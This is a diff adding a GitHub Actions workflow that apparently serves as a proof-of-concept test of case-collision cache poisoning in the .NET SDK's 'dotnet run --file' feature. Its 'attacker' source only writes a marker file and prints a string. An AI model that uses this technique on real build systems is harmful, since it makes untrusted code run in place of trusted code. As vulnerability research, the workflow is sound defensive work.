@@ -1,0 +1,131 @@
+name: SDK persistent case-collision cache poisoning
+
+on:
+  push:
+    branches:
+      - lab/kestrel-chunk-extensions-20260920
+    paths:
+      - '.github/workflows/sdk-fileapp-persistent-case-poison.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  persistent-poison:
+    strategy:
+      fail-fast: false
+      matrix:
+        sdk:
+          - 10.0.401
+          - 11.0.100-rc.1.26425.128
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    name: persistent-poison-${{ matrix.sdk }}
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: ${{ matrix.sdk }}
+
+      - name: Natural-timestamp build-only poison with attacker source deleted
+        shell: bash
+        run: |
+          set -euxo pipefail
+          dotnet --info
+
+          ROOT="$RUNNER_TEMP/sdk-fileapp-persistent-poison"
+          LOWER="$ROOT/victim/Program.cs"
+          UPPER="$ROOT/VICTIM/Program.cs"
+          MARKER="$RUNNER_TEMP/SDK_PERSISTENT_POISON.marker"
+
+          rm -rf "$ROOT"
+          rm -f "$MARKER"
+          mkdir -p "$(dirname "$LOWER")" "$(dirname "$UPPER")"
+
+          # Create the trusted victim FIRST using ordinary current filesystem timestamps.
+          cat > "$UPPER" <<'EOF'
+          using System;
+          Console.WriteLine("PERSISTENT_TRUSTED_VICTIM_EXECUTED");
+          EOF
+
+          # Create a distinct case-variant attacker source. It will only be built, never run.
+          cat > "$LOWER" <<EOF
+          using System;
+          using System.IO;
+          File.WriteAllText(@"$MARKER", "ATTACKER");
+          Console.WriteLine("PERSISTENT_ATTACKER_PAYLOAD_EXECUTED");
+          EOF
+
+          echo "=== Initial source metadata; no timestamp manipulation ==="
+          stat "$UPPER" "$LOWER"
+
+          python3 - "$LOWER" "$UPPER" <<'PY'
+          import hashlib, sys
+          for p in sys.argv[1:]:
+              print(p, hashlib.sha256(p.upper().encode()).hexdigest())
+          print("CASE_NORMALIZED_PATHS_EQUAL=", sys.argv[1].upper() == sys.argv[2].upper())
+          PY
+
+          echo "=== Build attacker case variant only; source code must NOT execute ==="
+          dotnet build "$LOWER" > "$ROOT/build.stdout" 2> "$ROOT/build.stderr"
+          cat "$ROOT/build.stdout"
+          cat "$ROOT/build.stderr"
+          if test -f "$MARKER"; then
+            echo 'PERSISTENT_BUILD_PRECONDITION=FAILED_ATTACKER_EXECUTED'
+            exit 1
+          fi
+          echo 'PERSISTENT_BUILD_PRECONDITION=PASS_NO_EXECUTION'
+
+          echo "=== Remove attacker source completely before trusted run ==="
+          rm -rf "$(dirname "$LOWER")"
+          test ! -e "$LOWER"
+          echo 'ATTACKER_SOURCE_REMOVED=true'
+
+          echo "=== Run surviving trusted case-variant source normally ==="
+          rm -f "$MARKER"
+          dotnet run --file "$UPPER" > "$ROOT/victim.stdout" 2> "$ROOT/victim.stderr"
+          cat "$ROOT/victim.stdout"
+          cat "$ROOT/victim.stderr"
+
+          if grep -q 'PERSISTENT_ATTACKER_PAYLOAD_EXECUTED' "$ROOT/victim.stdout" && test -f "$MARKER"; then
+            echo 'PERSISTENT_POISON_RESULT=ATTACKER_EXECUTED_AFTER_SOURCE_REMOVAL'
+          elif grep -q 'PERSISTENT_TRUSTED_VICTIM_EXECUTED' "$ROOT/victim.stdout"; then
+            echo 'PERSISTENT_POISON_RESULT=VICTIM_SAFE'
+          else
+            echo 'PERSISTENT_POISON_RESULT=UNKNOWN'
+          fi
+
+          echo "=== Hard control: bypass cache ==="
+          rm -f "$MARKER"
+          dotnet run --file "$UPPER" --no-cache > "$ROOT/nocache.stdout" 2> "$ROOT/nocache.stderr"
+          cat "$ROOT/nocache.stdout"
+          cat "$ROOT/nocache.stderr"
+
+          if grep -q 'PERSISTENT_TRUSTED_VICTIM_EXECUTED' "$ROOT/nocache.stdout" && ! test -f "$MARKER"; then
+            echo 'PERSISTENT_NO_CACHE_CONTROL=TRUSTED_VICTIM_EXECUTED'
+          else
+            echo 'PERSISTENT_NO_CACHE_CONTROL=FAILED'
+            exit 1
+          fi
+
+          cp "$ROOT/build.stdout" "$GITHUB_WORKSPACE/persistent-build.stdout"
+          cp "$ROOT/build.stderr" "$GITHUB_WORKSPACE/persistent-build.stderr"
+          cp "$ROOT/victim.stdout" "$GITHUB_WORKSPACE/persistent-victim.stdout"
+          cp "$ROOT/victim.stderr" "$GITHUB_WORKSPACE/persistent-victim.stderr"
+          cp "$ROOT/nocache.stdout" "$GITHUB_WORKSPACE/persistent-nocache.stdout"
+          cp "$ROOT/nocache.stderr" "$GITHUB_WORKSPACE/persistent-nocache.stderr"
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: sdk-persistent-case-poison-${{ matrix.sdk }}
+          path: |
+            persistent-build.stdout
+            persistent-build.stderr
+            persistent-victim.stdout
+            persistent-victim.stderr
+            persistent-nocache.stdout
+            persistent-nocache.stderr
